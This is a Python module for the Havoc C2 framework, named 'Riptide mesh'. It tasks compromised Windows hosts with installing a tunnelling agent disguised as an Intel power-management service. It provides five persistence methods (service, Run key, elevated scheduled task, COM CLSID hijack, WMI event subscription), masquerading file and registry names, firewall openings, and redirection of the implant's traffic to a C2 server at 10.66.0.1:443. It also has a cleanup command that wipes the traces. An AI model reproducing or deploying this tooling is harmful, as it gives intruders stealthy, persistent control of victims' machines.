"""Riptide mesh BOF — overlay installer for Maelstrom / Havoc.

  mesh ram <exe> [conf]
  mesh install --client|--hub [--persist [svc|run|onlogon|clsid|wmi,...]] <exe> [conf] [svc]
  mesh proxy [host] [port]
  mesh clear [svc]
  mesh checkin
  mesh help [cmd]
  help mesh
  help mesh install
"""
from havoc import Demon, RegisterCommand

try:
    from havoc import RegisterModule
except ImportError:
    def RegisterModule(*_a, **_k):
        return None

import os

METHODS = {
    "svc", "service", "run", "autostart", "schtask", "onlogon", "task", "clsid", "com", "wmi",
}

MESH_HELP = """mesh — Riptide overlay (userspace WG, no TAP)

COMMANDS
  mesh ram <exe> [conf]
      One session only. CreateProcess, no SCM. Dies on logoff/kill.

  mesh install --client|--hub [--persist [METHOD]] <exe> [conf] [svc]
      --client   peer to VPS hub (default)
      --hub      also open firewall UDP ListenPort from conf
      --persist  write 1 file + HKLM conf, then METHOD(s)
                 no METHOD = svc
      <exe>      staged agent   e.g. C:\\Users\\Public\\ipmasvc.exe
      [conf]     peer.conf      persist: eaten into HKLM, file deleted
      [svc]      service name   default IntelPma

  mesh persist <exe> [conf] [svc]
      alias:  mesh install --client --persist svc

  mesh hub <exe> [conf] [svc]
      alias:  mesh install --hub --persist svc

  mesh proxy [host] [port]
      Demon WinHTTP + IE proxy → riptide HTTP CONNECT → C2 10.66.0.1:443
      default 127.0.0.1 8080. Existing Demon picks it up on reconnect.

  mesh checkin
      overlay on/off :1080 :8080 :7670 :7668  svc=on|off

  mesh clear [svc]
      wipe SCM, HKCU Run, schtask, CLSID, WMI, ProgramData file, HKLM, firewall

  mesh help [cmd]
  help mesh
  help mesh install

PERSIST METHODS  (comma or +  e.g. svc,onlogon,wmi)
  svc | service     SCM delayed-auto, NetworkService
  run | autostart   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  onlogon | schtask | task    schtasks /sc ONLOGON /rl HIGHEST
  clsid | com       HKCU CLSID {8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F405}\\LocalServer32
                    + schtask CoCreateInstance
  wmi               WMI __EventFilter + CommandLineEventConsumer on Win32_LogonSession

DISK (persist)
  1 file  %ProgramData%\\Intel\\Ipma\\ipmasvc.exe
  conf    HKLM\\SOFTWARE\\Intel\\PowerManager\\Data   (reg: prefix)

EXAMPLES
  mesh ram C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf
  mesh install --client --persist svc,onlogon C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf IntelPma
  mesh install --hub --persist clsid,wmi C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf
  mesh proxy 127.0.0.1 8080
  mesh checkin
  mesh clear IntelPma
"""

MESH_TOPICS = {
    "ram": (
        "mesh ram <exe> [conf]\n"
        "  Run overlay for THIS session (CreateProcess). No SCM, no disk copy.\n"
        "  Dies with logoff / process kill.\n"
        "  ex: mesh ram C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf"
    ),
    "install": (
        "mesh install --client|--hub [--persist [METHOD]] <exe> [conf] [svc]\n"
        "  --client   peer (default)\n"
        "  --hub      firewall UDP ListenPort\n"
        "  --persist  METHOD default svc. comma ok: svc,onlogon,clsid,wmi\n"
        "  METHOD     svc|run|onlogon|clsid|wmi\n"
        "  persist disk: %ProgramData%\\Intel\\Ipma\\ipmasvc.exe\n"
        "             + HKLM\\SOFTWARE\\Intel\\PowerManager\\Data\n"
        "  no --persist: copy to %ProgramFiles%\\Riptide\\ and spawn (session)\n"
        "  ex: mesh install --client --persist svc,onlogon C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf IntelPma"
    ),
    "persist": (
        "mesh persist <exe> [conf] [svc]\n"
        "  alias of: mesh install --client --persist svc\n"
        "  Methods if you want more than svc: use mesh install --persist svc,onlogon,..."
    ),
    "hub": (
        "mesh hub <exe> [conf] [svc]\n"
        "  alias of: mesh install --hub --persist svc\n"
        "  Opens firewall UDP ListenPort from peer.conf."
    ),
    "proxy": (
        "mesh proxy [host] [port]\n"
        "  Sets HKCU Internet Settings + netsh winhttp proxy.\n"
        "  default 127.0.0.1:8080  (riptide HTTP CONNECT → 10.66.0.1:443)\n"
        "  Existing Demon picks proxy on reconnect.\n"
        "  ex: mesh proxy 127.0.0.1 8080"
    ),
    "checkin": (
        "mesh checkin\n"
        "  TCP probe 127.0.0.1 :1080 (SOCKS) :8080 (C2 proxy) :7670 (exit) :7668 (roster)\n"
        "  + SCM IntelPma running?\n"
        "  prints: [mesh] on|off :ports  svc=on|off  1080= 8080= 7670= 7668="
    ),
    "clear": (
        "mesh clear [svc]\n"
        "  Stop/delete IntelPma (+ IntelPmaHub, RiptideAgent, [svc])\n"
        "  Delete ProgramData\\Intel\\Ipma\\ipmasvc.exe and ProgramFiles\\Riptide\\\n"
        "  Drop HKLM PowerManager, HKCU Run, schtask IntelPma/IntelPmaCOM, CLSID, WMI, fw rule"
    ),
    "help": "mesh help [ram|install|persist|hub|proxy|checkin|clear]\nhelp mesh\nhelp mesh install",
}


def _kit_dir():
    env = os.environ.get("RIPTIDE_BOF") or os.environ.get("MESH_BOF")
    cands = []
    if env:
        cands.append(env)
    try:
        cands.append(os.path.dirname(os.path.abspath(__file__)))
    except (NameError, TypeError):
        pass
    cands.append(os.path.expanduser("~/github/maelstrom-mesh/bof"))
    cands.append(os.path.expanduser("~/github/maelstrom/modules/mesh"))
    for d in cands:
        if d and os.path.isfile(os.path.join(d, "mesh_install.x64.o")):
            return d
    return os.path.expanduser("~/github/maelstrom-mesh/bof")


def _obj_local():
    return os.path.join(_kit_dir(), "mesh_install.x64.o")


def _obj_exec():
    local = _obj_local()
    # mop → VPS TS opens this path on the teamserver host unless args.binary is set
    if os.environ.get("MAELSTROM_MOP_URL") and os.path.isfile(local):
        return "/opt/maelstrom/modules/mesh/mesh_install.x64.o"
    return local


def _is_method(s):
    if not s:
        return False
    parts = s.lower().replace("+", ",").split(",")
    return all(x.strip() in METHODS for x in parts if x.strip())


def _parse_install(param):
    role = "client"
    methods = ""
    persist = False
    paths = []
    i = 0
    p = list(param)
    while i < len(p):
        t = p[i]
        tl = t.lower()
        if tl in ("--hub", "-hub"):
            role = "hub"
        elif tl in ("--client", "-client"):
            role = "client"
        elif tl.startswith("--persist="):
            persist = True
            methods = t.split("=", 1)[1]
        elif tl in ("--persist", "-persist"):
            persist = True
            if i + 1 < len(p) and not p[i + 1].startswith("-") and _is_method(p[i + 1]):
                i += 1
                methods = p[i]
        else:
            paths.append(t)
        i += 1
    if persist and not methods:
        methods = "svc"
    exe = paths[0] if len(paths) > 0 else ""
    conf = paths[1] if len(paths) > 1 else ""
    svc = paths[2] if len(paths) > 2 else "IntelPma"
    return role, methods, exe, conf, svc


def _note(demon, msg):
    demon.ConsoleWrite(demon.CONSOLE_INFO, msg)


def _fire6(demonID, cmd, a, b, c, d, e, label):
    demon = Demon(demonID)
    local = _obj_local()
    if not os.path.isfile(local):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing %s — make -C bof" % local)
        return False
    obj = _obj_exec()
    _note(
        demon,
        "[mesh] %s  %s %s %s %s %s" % (cmd, a or "-", b or "-", c or "-", d or "-", e or "-"),
    )
    packer = Packer()
    packer.addstr(cmd)
    packer.addstr(a or "")
    packer.addstr(b or "")
    packer.addstr(c or "")
    packer.addstr(d or "")
    packer.addstr(e or "")
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, label)
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def mesh_root(demonID, *param):
    """bare `mesh` — help, or install --client if exe given."""
    if not param:
        return mesh_help(demonID)
    if param and str(param[0]).lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, *param[1:])
    return mesh_install(demonID, *param)


def mesh_install(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "install")
    role, methods, exe, conf, svc = _parse_install(param)
    if not exe:
        return mesh_help(demonID, "install")
    label = "mesh install --%s" % role
    if methods:
        label += " --persist %s" % methods
    d = Demon(demonID)
    _note(
        d,
        "[mesh] install role=%s persist=%s exe=%s conf=%s svc=%s"
        % (role, methods or "(session)", exe, conf or "-", svc),
    )
    return _fire6(demonID, "install", role, methods, exe, conf, svc, label)


def mesh_ram(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "ram")
    exe = param[0] if len(param) > 0 else ""
    conf = param[1] if len(param) > 1 else ""
    if not exe:
        return mesh_help(demonID, "ram")
    d = Demon(demonID)
    _note(d, "[mesh] ram exe=%s conf=%s" % (exe, conf or "(none)"))
    return _fire6(demonID, "ram", exe, conf, "", "", "", "mesh ram")


def mesh_persist(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "persist")
    return mesh_install(demonID, *(("--client", "--persist", "svc") + tuple(param)))


def mesh_hub(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "hub")
    return mesh_install(demonID, *(("--hub", "--persist", "svc") + tuple(param)))


def mesh_clear(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "clear")
    svc = param[0] if param else ""
    d = Demon(demonID)
    _note(d, "[mesh] clear svc=%s" % (svc or "IntelPma"))
    return _fire6(demonID, "clear", svc, "", "", "", "", "mesh clear")


def mesh_proxy(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "proxy")
    host = param[0] if len(param) > 0 else "127.0.0.1"
    port = param[1] if len(param) > 1 else "8080"
    d = Demon(demonID)
    _note(d, "[mesh] proxy %s:%s  (WinHTTP+IE → riptide CONNECT → 10.66.0.1:443)" % (host, port))
    return _fire6(demonID, "proxy", host, port, "", "", "", "mesh proxy")


def mesh_checkin(demonID, *param):
    p = [str(x) for x in param]
    if p and p[0].lower() in ("help", "-h", "--help"):
        return mesh_help(demonID, "checkin")
    d = Demon(demonID)
    _note(d, "[mesh] checkin  probe :1080 :8080 :7670 :7668 + svc IntelPma")
    return _fire6(demonID, "checkin", "", "", "", "", "", "mesh checkin")


def mesh_help(demonID, *param):
    demon = Demon(demonID)
    key = ""
    if param:
        key = str(param[0]).lower().lstrip("-")
        if key == "h":
            key = ""
    text = MESH_TOPICS.get(key) or MESH_HELP
    demon.ConsoleWrite(demon.CONSOLE_INFO, text)
    local = _obj_local()
    if os.path.isfile(local):
        label = "mesh help" + ((" " + key) if key else "")
        return _fire6(demonID, "help", key, "", "", "", "", label)
    # GUI needs True so PrintModuleCachedMessages flushes CONSOLE_INFO
    return True


RegisterModule(
    "mesh",
    MESH_HELP,
    "API Only",
    "ram|install|proxy|checkin|clear|help\n"
    "  --client|--hub\n"
    "  --persist [svc|run|onlogon|clsid|wmi]  (comma ok, default svc)\n"
    "  persist disk: %ProgramData%\\Intel\\Ipma\\ipmasvc.exe + HKLM PowerManager\\Data",
    "help",
    "",
)

RegisterCommand(mesh_root, "", "mesh", "Riptide overlay. Sub: ram|install|proxy|checkin|clear|help  (bare = help)", 0, "help | ram <exe> [conf] | install --client|--hub [--persist METHOD] <exe> [conf] [svc] | proxy [host] [port] | checkin | clear [svc]", "help")
RegisterCommand(mesh_install, "mesh", "install", "Install overlay. Flags: --client|--hub [--persist METHOD] <exe> [conf] [svc]. METHOD=svc|run|onlogon|clsid|wmi (comma ok)", 0, "--client|--hub [--persist [svc|run|onlogon|clsid|wmi]] <exe> [conf] [svc]", r"--client --persist svc,onlogon C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPma")
RegisterCommand(mesh_ram, "mesh", "ram", "One session, no SCM. Dies on logoff. Args: <exe> [conf]", 0, "<exe> [conf]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf")
RegisterCommand(mesh_persist, "mesh", "persist", "alias of install --client --persist svc. Disk: 1 file ProgramData + HKLM conf", 0, "<exe> [conf] [svc]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPma")
RegisterCommand(mesh_hub, "mesh", "hub", "alias of install --hub --persist svc. Also firewall UDP ListenPort", 0, "<exe> [conf] [svc]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPmaHub")
RegisterCommand(mesh_proxy, "mesh", "proxy", "Point Demon WinHTTP+IE at riptide CONNECT (default 127.0.0.1:8080 → 10.66.0.1:443)", 0, "[host] [port]", "127.0.0.1 8080")
RegisterCommand(mesh_checkin, "mesh", "checkin", "overlay on/off :1080 SOCKS :8080 C2proxy :7670 exit :7668 roster  svc=on|off", 0, "", "")
RegisterCommand(mesh_clear, "mesh", "clear", "Wipe SCM + Run + schtask + CLSID + WMI + ProgramData + HKLM + fw", 0, "[svc]", "IntelPma")
RegisterCommand(mesh_help, "mesh", "help", "Flags, persist methods, what each command does. mesh help [ram|install|proxy|checkin|clear]", 0, "[ram|install|persist|hub|proxy|checkin|clear]", "install")
